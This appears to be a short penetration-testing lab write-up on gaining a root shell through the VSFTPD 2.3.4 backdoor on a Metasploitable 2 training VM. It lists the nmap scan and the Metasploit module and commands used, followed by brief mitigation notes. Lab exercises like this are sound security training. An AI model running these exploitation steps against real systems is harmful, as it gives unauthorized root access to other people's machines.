 Lab 01 – VSFTPD 2.3.4 Backdoor Exploitation

## Objective
Test VSFTPD 2.3.4 for known backdoor vulnerabilities.

## Environment
- Attacker: Kali Linux
- Target: Metasploitable 2 VM
- Network: NAT

## Enumeration
- Nmap scan results:
nmap -sV <TARGET-IP>

- Open ports: 21 (ftp), 22 (ssh), 80 (http)
- VSFTPD version 2.3.4 detected

## Exploitation
- Used Metasploit module: `exploit/unix/ftp/vsftpd_234_backdoor`
- Commands executed:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET-IP>
exploit


## Post Exploitation
- Root shell obtained
- Verified access with `whoami`
- Screenshot evidence included below

## Mitigation
- Update VSFTPD to latest version
- Disable backdoor features![Nmap](https://github.com/user-attachments/assets/e8231447-58e2-40d3-acfc-1754ee26150b)
![vsftpd](https://github.com/user-attachments/assets/4f6af7b3-63fb-4077-bf67-f71af379184a)
